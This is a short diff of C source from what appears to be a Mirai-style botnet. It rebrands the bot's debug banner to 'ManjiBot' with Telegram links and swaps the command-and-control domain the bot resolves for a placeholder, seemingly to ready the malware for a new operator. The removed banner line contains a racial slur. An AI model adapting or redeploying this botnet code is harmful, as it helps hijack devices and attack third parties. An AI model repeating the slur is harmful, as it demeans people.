@@ -243,7 +243,7 @@ int main(int argc, char **args)
 
 
     #ifdef DEBUG
-        printf("NiggaNet debug mode\n");
+        printf("ManjiBot debug mode (t.me/syntraffic), (t.me/join_silence)\n");
     #endif
 
     #ifndef DEBUG
@@ -739,7 +739,7 @@ static void resolve_cnc_addr(void) {
     entries = NULL;
     
     while (retries > 0 && entries == NULL) {
-    entries = resolv_lookup("snowy.dstat.pw");
+    entries = resolv_lookup("yourdomain.com");
         if (entries == NULL) {
             #ifdef DEBUG
                 printf("[main] Failed to resolve CNC address, retrying...\n");
